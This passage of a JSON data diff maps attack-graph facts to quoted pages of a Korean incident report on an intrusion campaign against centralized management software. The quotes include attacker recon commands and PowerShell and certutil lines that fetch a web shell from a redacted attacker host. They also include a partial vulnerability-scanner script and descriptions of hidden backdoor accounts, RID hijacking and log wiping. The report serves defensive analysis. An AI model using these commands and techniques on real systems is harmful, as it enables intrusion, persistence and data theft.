+          "text": "공격자는 명령제어 통신을 위해 파이프를 활용한다. 감염단말기에서 명령어를 외부에서 수신받아\n실행한 후, 그 결과를 송신하는 방식은 아래와 같다.\n\u0000첫번째 파이프의 입력단에 공격자의 명령어 쓰기\n\u0000첫번째 파이프의 출력단은 새로 생성될 프로세스의 표준입력으로 전달\n\u0000새로운 프로세스에서 표준출력(stdout), 표준에러(stderr)는 두번째 파이프의 입력단으로 전\n달\n\u0000두번째 파이프의 출력단은 파일 핸들로서, 데이터가 존재하는 경우 C2 서버로 전달\nSoftware Deployment Tools\n제로데이 취약점을 통해 중앙 집중형 관리 솔루션에 침투한 공격자는 솔루션의 정책 배포, 파일 배\n포 기능을 이용하여 추가로 내부에 악성 코드를 전파하였다.\n대부분의 중앙 집중형 관리 솔루션에는 로그인 성공, 실패와 같은 인증로그, 정책 배포 일자를 기록\n한 로그, 어떠한 파일이 배포되었는지를 알리는 로그 등 자체 감사 로그가 있다. 해당 로그들을 통해\n악성코드의 유포 사실을 알 수 있었다.\n공격자가 인증우회 취약점을 이용하여 공격에 성공하면 지속적인 접근을 위해 공격용 관리자 계정\n을 생성한다. 이때 보통 ‘admin1ʼ이라는 계정 이름을 많이 사용한 것으로 확인되었다. 공격용 관리\n자 계정으로 로그인 이후 공격자는 중앙 집중형 관리 솔루션의 파일 배포 및 실행 기능을 이용하여\n악성코드를 내부 시스템에 전파한다. 전파 이후 공격에 악용된 계정을 삭제조치하여 흔적을 지웠다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 23"
+        },
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        },
+        {
+          "page_number": 25,
+          "text": "Command and Control\nProxy: Internal Proxy\n공격자는 내부에서 특정 단말기를 통해 감염된 다수 단말기로 명령어를 전달하는 방식을 사용하였\n다. 최초 실행시 설정하는 명령제어지를 제외하고, 다수 단말기에 명령제어를 수행하기 위하여IP 리\n스트를 전달하는 방식으로 구현하였다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 25"
+        },
+        {
+          "page_number": 26,
+          "text": "Exfiltrate\nExfiltration Over C2 Channel\n공격자는 Collection 단계를 통해 본인이 원하는 파일 정보를 획득, 명령어(51)을 통해 파일을 읽고\nC2 채널로 송부하도록 악성코드를 구현하였다. 참고로 악성코드 내에서 송부하는 함수명은\nFileDownload라고 명명되어 있다. File Upload가 아니라 File Download라는 이름을 통해 우리\n는 공격자의 관점에서 악성코드가 구현되어 있음을 알 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 26"
+        }
+      ],
+      "producers": [
+        "N02",
+        "N03"
+      ],
+      "consumers": [
+        "N05",
+        "N08",
+        "N10",
+        "N12",
+        "N13",
+        "N14",
+        "N15"
+      ]
+    },
+    "F13": {
+      "fact_id": "F13",
+      "name": "host.system.recon_info",
+      "description": "수집된 시스템·계정·디렉터리 정보(ipconfig/all·net user·systeminfo 결과)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 19,
+          "text": "dir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test1.txt\npowershell \"net user\" > c:\\inetpub\\wwwroot\\test.txt\ndir \"c:\\inetpub\\wwwroot\\down\"\ndir \"c:\\users\\\"\ndir \"c:\\users\\administrator\"\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nnetstat -naop tcp | findstr ESTA\nquery session\ndir c:\\*\ntasklist > c:\\inetpub\\wwwroot\\a.txt\npowershell ls c:\\\ncmd.exe -c dir c:\\*\ntaskkill /f /im cmd.exe\n공격자\npowershell \"wget -Uri http://[ IP]/venus.asp -OutFile c:\\users\\\n공격자\ncertutil.exe -urlc\"\"\"\"\"\"ache -split -f http://[ IP]/venus.asp c\nren x:\\inetpub\\wwwroot\\venus.asp x:\\inetpub\\wwwroot\\wwinstallguide\nPersistence\nServer Software Component: Web Shell\n침투에 성공한 공격자는 지속성 유지를 위해 운영체제 명령 실행이 가능한 웹셸을 생성하였다. 웹\n셸의 사용자 인터페이스는 테스트 코드처럼 보이도록 디자인되어, 악성 파일로 의심받는 것을 회피\n하려는 의도가 있었다.\n공격자 사용 웹셸 화면\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 19"
+        }
+      ],
+      "producers": [
+        "N03"
+      ],
+      "consumers": []
+    },
+    "F14": {
+      "fact_id": "F14",
+      "name": "host.web_shell.path",
+      "description": "생성된 웹셸 경로(x:\\inetpub\\wwwroot\\venus.asp)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        }
+      ],
+      "producers": [
+        "N04"
+      ],
+      "consumers": []
+    },
+    "F15": {
+      "fact_id": "F15",
+      "name": "host.backdoor.account",
+      "description": "생성된 백도어 OS 계정(white$, 500 RID, 숨김 속성)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 22,
+          "text": "Credential Access\nOS Credential Dumping: Security Account Manager\n공격자가 백도어 계정에 RID Hijacking을 시도한 흔적이 발견되었다. RID Hijacking은 토큰 발급\n과정의 취약점을 이용해 특정 계정에 권한을 부여하는 기법이다. 이 기법을 사용하려면 SYSTEM\n권한이 필요하므로, 공격자는 PSEXEC 도구를 사용하여 피해 시스템에서 해당 동작을 실행했을 가\n능성이 높다. 피해 업체에서는 'white$'라는 계정이 백도어 계정이었으며, 이 계정은 관리자 권한\n에 해당하는 500 RID를 가지고 있었다.\n해당 공격자는 백도어 계정을 생성할 때 'white'나 'black'이란 이름을 사용하고 뒤에 '$'를 붙이는\n특징이 있다. 계정을 생성할 때 뒤에 ‘$ʼ 문자를 붙이게 되면 숨김 속성의 계정을 만들 수 있어, 관리\n자가 새롭게 만들어진 계정을 인지하지 못하게 하였다.\n$가 붙은 계정의 조회 결과\n이와 같은 기능은 공격자가 사용한 계정 생성 악성코드에 포함되어 있었다.\n공격자가 사용한 계정 white$\nLateral Movement\nLateral Tool Transfer\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 22"
+        }
+      ],
+      "producers": [
+        "N09"
+      ],
+      "consumers": []
+    },
+    "F16": {
+      "fact_id": "F16",
+      "name": "target.management_solution.admin_account",
+      "description": "솔루션에 생성한 공격용 관리자 계정(admin1)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 21,
+          "text": "취약점 공격의 대상이 된 중앙 집중형 관리 솔루션에는 별도의 인증 과정 없이 관리자 계정을 생성\n할 수 있는 제로데이 취약점이 있었다. 이런 취약점을 악용하여 공격자는 공격용 계정을 생성하고\n악성코드를 유포하는 활동을 진행하였다. 이 과정을 통해 공격 목표를 달성한 공격자는 자신의 흔적\n을 지우기 위해 관리자 계정 생성 로그와 공격용 관리자 계정을 삭제하였다.\n공격자는 관리자 계정 생성 로그가 중앙 관리 솔루션 DB에 저장되는 것까지 파악하고 있었고, 그에\n맞춰 개발한 java 코드를 이용하여 로그를 삭제하였다. 이는 공격자가 취약점 공격 전에 제품 테스\n트와 분석을 충분히 수행했음을 나타낸다.\n솔루션 기능에 맞게 개발된 로그 삭제 코드\nObfuscated Files or Information: Dynamic API Resolution\n공격자는 동적으로 API를 로드하여 활용하기 위하여 base64 방식을 활용한다. 악성코드에서는 디\n코드된 문자열을 참조하여 함수의 주소를 획득, 활용한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 21"
+        },
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "producers": [
+        "N11"
+      ],
+      "consumers": [
+        "N07"
+      ]
+    },
+    "F17": {
+      "fact_id": "F17",
+      "name": "target.internal_host.deployed_malware",
+      "description": "배포 기능으로 내부 단말에 전파된 악성코드",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "producers": [
+        "N11"
+      ],
+      "consumers": []
+    },
+    "F18": {
+      "fact_id": "F18",
+      "name": "host.file.inventory",
+      "description": "수집한 드라이브·폴더·파일 목록(명령 61·62 결과)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        },
+        {
+          "page_number": 26,
+          "text": "Exfiltrate\nExfiltration Over C2 Channel\n공격자는 Collection 단계를 통해 본인이 원하는 파일 정보를 획득, 명령어(51)을 통해 파일을 읽고\nC2 채널로 송부하도록 악성코드를 구현하였다. 참고로 악성코드 내에서 송부하는 함수명은\nFileDownload라고 명명되어 있다. File Upload가 아니라 File Download라는 이름을 통해 우리\n는 공격자의 관점에서 악성코드가 구현되어 있음을 알 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 26"
+        }
+      ],
+      "producers": [
+        "N12"
+      ],
+      "consumers": [
+        "N15"
+      ]
+    },
+    "F19": {
+      "fact_id": "F19",
+      "name": "host.screen.capture_image",
+      "description": "JPEG 화면 캡처 이미지(명령 31, image_jpeg_Encode)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 25,
+          "text": "Command and Control\nProxy: Internal Proxy\n공격자는 내부에서 특정 단말기를 통해 감염된 다수 단말기로 명령어를 전달하는 방식을 사용하였\n다. 최초 실행시 설정하는 명령제어지를 제외하고, 다수 단말기에 명령제어를 수행하기 위하여IP 리\n스트를 전달하는 방식으로 구현하였다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 25"
+        },
+        {
+          "page_number": 26,
+          "text": "Exfiltrate\nExfiltration Over C2 Channel\n공격자는 Collection 단계를 통해 본인이 원하는 파일 정보를 획득, 명령어(51)을 통해 파일을 읽고\nC2 채널로 송부하도록 악성코드를 구현하였다. 참고로 악성코드 내에서 송부하는 함수명은\nFileDownload라고 명명되어 있다. File Upload가 아니라 File Download라는 이름을 통해 우리\n는 공격자의 관점에서 악성코드가 구현되어 있음을 알 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 26"
+        }
+      ],
+      "producers": [
+        "N13"
+      ],
+      "consumers": [
+        "N15"
+      ]
+    },
+    "F20": {
+      "fact_id": "F20",
+      "name": "attacker.c2.exfiltrated_data",
+      "description": "C2 채널로 유출된 파일 데이터(명령 51, FileDownload)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 12,
+          "text": "Exfiltration\nExfiltration Over C2 Channel\n공격자는 임대한 서버에 xampp 도구를 이용하여 웹페이지를 구축하였다. 이 웹페이지는 피해 기\n업에서 유출한 데이터를 업로드하는 용도로 사용했다.\n데이터 유출 과정\n유출된 파일들은 주로 기술 연구소의 데이터로, 이를 통해 공격자들이 특히 국내 기술 분야에 대한\n정보를 탈취하는 데 주력하고 있음을 알 수 있다. 또한, 피해 기업의 인사 정보와 EML 파일 등도 탈\n취되었는데, 이는 공격자들이 기업의 내부 정보에 대한 깊은 이해를 위해 노력하고 있음을 시사한\n다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 12"
+        },
+        {
+          "page_number": 26,
+          "text": "Exfiltrate\nExfiltration Over C2 Channel\n공격자는 Collection 단계를 통해 본인이 원하는 파일 정보를 획득, 명령어(51)을 통해 파일을 읽고\nC2 채널로 송부하도록 악성코드를 구현하였다. 참고로 악성코드 내에서 송부하는 함수명은\nFileDownload라고 명명되어 있다. File Upload가 아니라 File Download라는 이름을 통해 우리\n는 공격자의 관점에서 악성코드가 구현되어 있음을 알 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 26"
+        }
+      ],
+      "producers": [
+        "N15"
+      ],
+      "consumers": [
+        "N28"
+      ]
+    },
+    "F21": {
+      "fact_id": "F21",
+      "name": "attacker.rental_server.host",
+      "description": "가상자산 결제로 임대한 국내 호스팅 서버",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 7,
+          "text": "아래에는 공격자가 Chrome 브라우저를 통해 입력한 검색어들을 나열했다.\n목적 검색어\n네이버 폰인증하기\n네이버 회원가입 방법\n네이버 가입을 위한 검색 네이버 회원가입 시 인증번호 안 올 때 해결\n네이버 휴대폰없이 가입\n네이버 아이디 무제한으로 만드는 방법\n카카오톡 가입을 위한 검색 kakaotalk logins\n가상 번호를 사용하기 위한 검색 virtual SMS\n사내, 비번, 비밀번호, 정보, svn, 원격, 서버, 팀뷰어, 접근, 접속, 전\n침투한 서버 내에서 정보 검색 산, 시스템, 사내망, 사내, ip, domain, 도메일, 패스워드, 인터넷, 계\n정\n패스워드 파일로 위장하여 유포중인 악성코드- ASEC BLOG\n자산관리 프로그램을 악용한 공격 정황 포착 (Andariel 그룹) -\n보안 블로그 접속\nASEC BLOG\n20231101_kimsuky_OP.Covert-Stalker.pdf\n키로깅 방법 검색 how to keylog when logonui.exe is run\nResource Development\nAcquire Infrastructure: Server\n공격자는 국내 피해업체를 공격하고 데이터를 탈취하기 위해 국내 호스팅 업체의 서버를 임대하여\n사용하였다.\n공격자는 서버를 임대할 기업을 정할 때 신분노출을 최소화하기 위해 가상자산으로 결제 가능한 곳\n을 선정하였다.\nAcquire Infrastructure: Virtual Private Server\n공격을 수행하는 동안 실제 위치를 숨기기 위해 공격자들은 종종 가상사설서버(VPS)를 사용한다.\n이번 사례에서도 공격자는 자신의 실제 IP 주소를 감추기 위해 VPS 서비스를 가입하고 사용한 흔\n적을 확인하였다. 분석 결과, 공격자는 주로 Vultr 호스팅 서비스를 이용하였음을 확인하였다.\nVultr 서비스 지불 로그\nDevelop Capabilities: Malware\n공격자는 원격제어 악성코드, 취약점 스캐너, 무작위 대입 공격 코드 등 다양한 도구를 활용하여 공\n격을 수행하였다. 공격자는 이번 오퍼레이션을 수행하기 위하여 공개된 해킹도구를 사용함과 동시\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 7"
+        },
+        {
+          "page_number": 12,
+          "text": "Exfiltration\nExfiltration Over C2 Channel\n공격자는 임대한 서버에 xampp 도구를 이용하여 웹페이지를 구축하였다. 이 웹페이지는 피해 기\n업에서 유출한 데이터를 업로드하는 용도로 사용했다.\n데이터 유출 과정\n유출된 파일들은 주로 기술 연구소의 데이터로, 이를 통해 공격자들이 특히 국내 기술 분야에 대한\n정보를 탈취하는 데 주력하고 있음을 알 수 있다. 또한, 피해 기업의 인사 정보와 EML 파일 등도 탈\n취되었는데, 이는 공격자들이 기업의 내부 정보에 대한 깊은 이해를 위해 노력하고 있음을 시사한\n다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 12"
+        }
+      ],
+      "producers": [
+        "N20"
+      ],
+      "consumers": [
+        "N28"
+      ]
+    },
+    "F22": {
+      "fact_id": "F22",
+      "name": "attacker.vps.host",
+      "description": "실제 IP 은닉용 Vultr VPS",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 7,
+          "text": "아래에는 공격자가 Chrome 브라우저를 통해 입력한 검색어들을 나열했다.\n목적 검색어\n네이버 폰인증하기\n네이버 회원가입 방법\n네이버 가입을 위한 검색 네이버 회원가입 시 인증번호 안 올 때 해결\n네이버 휴대폰없이 가입\n네이버 아이디 무제한으로 만드는 방법\n카카오톡 가입을 위한 검색 kakaotalk logins\n가상 번호를 사용하기 위한 검색 virtual SMS\n사내, 비번, 비밀번호, 정보, svn, 원격, 서버, 팀뷰어, 접근, 접속, 전\n침투한 서버 내에서 정보 검색 산, 시스템, 사내망, 사내, ip, domain, 도메일, 패스워드, 인터넷, 계\n정\n패스워드 파일로 위장하여 유포중인 악성코드- ASEC BLOG\n자산관리 프로그램을 악용한 공격 정황 포착 (Andariel 그룹) -\n보안 블로그 접속\nASEC BLOG\n20231101_kimsuky_OP.Covert-Stalker.pdf\n키로깅 방법 검색 how to keylog when logonui.exe is run\nResource Development\nAcquire Infrastructure: Server\n공격자는 국내 피해업체를 공격하고 데이터를 탈취하기 위해 국내 호스팅 업체의 서버를 임대하여\n사용하였다.\n공격자는 서버를 임대할 기업을 정할 때 신분노출을 최소화하기 위해 가상자산으로 결제 가능한 곳\n을 선정하였다.\nAcquire Infrastructure: Virtual Private Server\n공격을 수행하는 동안 실제 위치를 숨기기 위해 공격자들은 종종 가상사설서버(VPS)를 사용한다.\n이번 사례에서도 공격자는 자신의 실제 IP 주소를 감추기 위해 VPS 서비스를 가입하고 사용한 흔\n적을 확인하였다. 분석 결과, 공격자는 주로 Vultr 호스팅 서비스를 이용하였음을 확인하였다.\nVultr 서비스 지불 로그\nDevelop Capabilities: Malware\n공격자는 원격제어 악성코드, 취약점 스캐너, 무작위 대입 공격 코드 등 다양한 도구를 활용하여 공\n격을 수행하였다. 공격자는 이번 오퍼레이션을 수행하기 위하여 공개된 해킹도구를 사용함과 동시\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 7"
+        }
+      ],
+      "producers": [
+        "N21"
+      ],
+      "consumers": []
+    },
+    "F23": {
+      "fact_id": "F23",
+      "name": "attacker.rental_server.credential",
+      "description": "무작위 대입으로 확보한 임대 서버 접속 계정",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 4,
+          "text": "공격자는 이번 공격을 수행하기 위해 특정 국내 서버를 임대하였다. 이 임대 업체는 고객에게 서버\n를 제공할 때 특정한 패턴을 따르는 기본 RDPRemote Desktop Protocol) 접속 비밀번호를 설정\n한다. 이러한 패턴을 알고 있던 공격자는 이를 이용하여 임대받은 서버의 IP 대역을 대상으로 무작\n위 대입 공격을 실행하였다.\n임대서버의 기본 계정정보를 이용한 무작위 대입공격\n공격자의 메일에서 발견된 임대서버의 기본 패스워드\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 4"
+        }
+      ],
+      "producers": [
+        "N16"
+      ],
+      "consumers": []
+    },
+    "F24": {
+      "fact_id": "F24",
+      "name": "target.recon.shodan_info",
+      "description": "Shodan으로 수집한 목표 네트워크·기기·취약점 정보",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 5,
+          "text": "무작위 대입공격에 사용된 Dictionary\nSearch Open Technical Databases: Scan Databases\n공격자는 초기에 'Shodan'이라는 스캐닝 서비스 사이트를 사용하여 목표 기업의 정보를 수집했다.\n이를 통해 목표 기업의 네트워크 구조, 보안 취약점, 사용 중인 기기 등의 정보를 파악하였다. 이 정\n보는 공격 계획을 세우는데 필요한 자료로 활용되었다. 그러나 Shodan 서비스만으로는 필요한 정\n보를 모두 수집하기 어려웠기 때문에, 공격자는 직접 스캐닝 코드를 개발하기도 하였다.\nActive Scanning: Vulnerability Scanning\n공격자는 국내의 소프트웨어 제품에 대한 제로데이 취약점을 다수 가지고 있음이 확인되었다. 이러\n한 취약점을 효과적으로 활용하기 위해, 공격자는 파이썬 프로그래밍 언어를 사용하여 스캐닝 코드\n를 작성하였다. 이 코드는 취약점을 가진 소프트웨어가 구동되고 있는 시스템을 찾아내는 역할을 수\n행한다.\nimport sys\nimport requests\ndef process_ip_list(ip_list_file, output_file):\nwith open(ip_list_file, 'r') as file:\nfor i, ip in enumerate(file, start=1):\n개행 문자 제거\nip = ip.strip() #\n제품명\nurl = f\"https://{ip}:8660/[ ]/ServerRequest/HealthC\ntry:\nresponse = requests.get(url, timeout=5, verify = F\n제품명\nif \"[ ]\" in response.text:\nwrite_to_file(output_file, ip)\nprint(f\"{i}. {ip} +++++\")\nelse:\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 5"
+        }
+      ],
+      "producers": [
+        "N17"
+      ],
+      "consumers": []
+    },
+    "F25": {
+      "fact_id": "F25",
+      "name": "attacker.recon.search_info",
+      "description": "구글 검색으로 수집한 인증우회·키로깅 등 정보",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 7,
+          "text": "아래에는 공격자가 Chrome 브라우저를 통해 입력한 검색어들을 나열했다.\n목적 검색어\n네이버 폰인증하기\n네이버 회원가입 방법\n네이버 가입을 위한 검색 네이버 회원가입 시 인증번호 안 올 때 해결\n네이버 휴대폰없이 가입\n네이버 아이디 무제한으로 만드는 방법\n카카오톡 가입을 위한 검색 kakaotalk logins\n가상 번호를 사용하기 위한 검색 virtual SMS\n사내, 비번, 비밀번호, 정보, svn, 원격, 서버, 팀뷰어, 접근, 접속, 전\n침투한 서버 내에서 정보 검색 산, 시스템, 사내망, 사내, ip, domain, 도메일, 패스워드, 인터넷, 계\n정\n패스워드 파일로 위장하여 유포중인 악성코드- ASEC BLOG\n자산관리 프로그램을 악용한 공격 정황 포착 (Andariel 그룹) -\n보안 블로그 접속\nASEC BLOG\n20231101_kimsuky_OP.Covert-Stalker.pdf\n키로깅 방법 검색 how to keylog when logonui.exe is run\nResource Development\nAcquire Infrastructure: Server\n공격자는 국내 피해업체를 공격하고 데이터를 탈취하기 위해 국내 호스팅 업체의 서버를 임대하여\n사용하였다.\n공격자는 서버를 임대할 기업을 정할 때 신분노출을 최소화하기 위해 가상자산으로 결제 가능한 곳\n을 선정하였다.\nAcquire Infrastructure: Virtual Private Server\n공격을 수행하는 동안 실제 위치를 숨기기 위해 공격자들은 종종 가상사설서버(VPS)를 사용한다.\n이번 사례에서도 공격자는 자신의 실제 IP 주소를 감추기 위해 VPS 서비스를 가입하고 사용한 흔\n적을 확인하였다. 분석 결과, 공격자는 주로 Vultr 호스팅 서비스를 이용하였음을 확인하였다.\nVultr 서비스 지불 로그\nDevelop Capabilities: Malware\n공격자는 원격제어 악성코드, 취약점 스캐너, 무작위 대입 공격 코드 등 다양한 도구를 활용하여 공\n격을 수행하였다. 공격자는 이번 오퍼레이션을 수행하기 위하여 공개된 해킹도구를 사용함과 동시\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 7"
+        }
+      ],
+      "producers": [
+        "N19"
+      ],
+      "consumers": []
+    },
+    "F26": {
+      "fact_id": "F26",
+      "name": "attacker.drive.encrypted",
+      "description": "VeraCrypt로 암호화한 공격 자원 드라이브",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 11,
+          "text": "도구 기능 로그에서 확인된 사용 목적\nObsidian 마크다운 에디터 -\nTypora 마크다운 에디터 -\nWireshark 네트워크 트래픽 모니터링 -\nProxifier 프록시 -\nv2rayN 프록시 -\nCCProxy 프록시 -\nSharpReverseProxy 리버스 프록시 -\nbore-v0.5.0 리버스 프록시 -\nloclx 리버스 프록시 -\nVisual Studio Code 코드 개발 -\nVisualGet 매크로 개발 -\nNavicat Premium 16 MySQL 관리 피해시스템 제어에 사용\n임대서버 내에 있는 데이터 보호\nVeraCrypt 디스크 암호화\n에 사용\n공격자끼리 연락에 사용\nTelegram 메신저\n데이터 유출에 사용\nQQ 메신저 공격자끼리 연락에 사용\nEveryThing 파일 검색 -\nMotrix 파일 다운로드 매니저 -\nInternet Download Manager 파일 다운로드 매니저 -\n취약점 테스트용 가상이미지 구\nVirtualBox 가상머신\n동에 사용\ngo-memexec 메모리 실행 라이브러리 악성코드 제작에 사용\nMemorySharp 메모리 편집 라이브러리 악성코드 제작에 사용\n시스템에 저장중인 패스워드(브\nProtected Storage PassView -\n라우져)를 출력\nInstant Messenger Password 메신저 애플리케이션의 사용자\n-\nRecovery Tool 계정 비밀번호를 복구\nDefense Evasion\nObfuscated Files or Information\n공격자는 공격을 위해 필요한 다양한 자원들을 보관하고 있는 특정 드라이브를 암호화하였다. 이 드\n라이브에는 공격에 필요한 해킹 도구, 원격제어 악성코드, 취약점 테스트용 가상머신 등 중요한 정\n보가 담겨 있었다.\n암호화에 사용된 도구는 VeraCrypt이라는 알려진 암호화 도구이다. 이 도구는 드라이브 전체를 효\n과적으로 암호화하여 외부의 접근을 차단하는데 사용된다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 11"
+        }
+      ],
+      "producers": [
+        "N27"
+      ],
+      "consumers": []
+    },
+    "F27": {
+      "fact_id": "F27",
+      "name": "attacker.web_path.staged_data",
+      "description": "xampp 임대서버 웹경로에 적재된 유출 자료",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 12,
+          "text": "Exfiltration\nExfiltration Over C2 Channel\n공격자는 임대한 서버에 xampp 도구를 이용하여 웹페이지를 구축하였다. 이 웹페이지는 피해 기\n업에서 유출한 데이터를 업로드하는 용도로 사용했다.\n데이터 유출 과정\n유출된 파일들은 주로 기술 연구소의 데이터로, 이를 통해 공격자들이 특히 국내 기술 분야에 대한\n정보를 탈취하는 데 주력하고 있음을 알 수 있다. 또한, 피해 기업의 인사 정보와 EML 파일 등도 탈\n취되었는데, 이는 공격자들이 기업의 내부 정보에 대한 깊은 이해를 위해 노력하고 있음을 시사한\n다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 12"
+        },
+        {
+          "page_number": 13,
+          "text": "유출된 자료의 일부\nExfiltration Over Web Service: Exfiltration to Cloud Storage\n임대 서버 브라우저 로그를 분석한 결과, 피해기업으로부터 탈취한 정보는 DropBox에 업로드되었\n다.\n침해사고\nTTP\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 13"
+        }
+      ],
+      "producers": [
+        "N28"
+      ],
+      "consumers": [
+        "N29"
+      ]
+    },
+    "F28": {
+      "fact_id": "F28",
+      "name": "attacker.cloud.exfiltrated_data",
+      "description": "DropBox에 업로드된 유출 자료",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 13,
+          "text": "유출된 자료의 일부\nExfiltration Over Web Service: Exfiltration to Cloud Storage\n임대 서버 브라우저 로그를 분석한 결과, 피해기업으로부터 탈취한 정보는 DropBox에 업로드되었\n다.\n침해사고\nTTP\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 13"
+        }
+      ],
+      "producers": [
+        "N29"
+      ],
+      "consumers": []
+    },
+    "F29": {
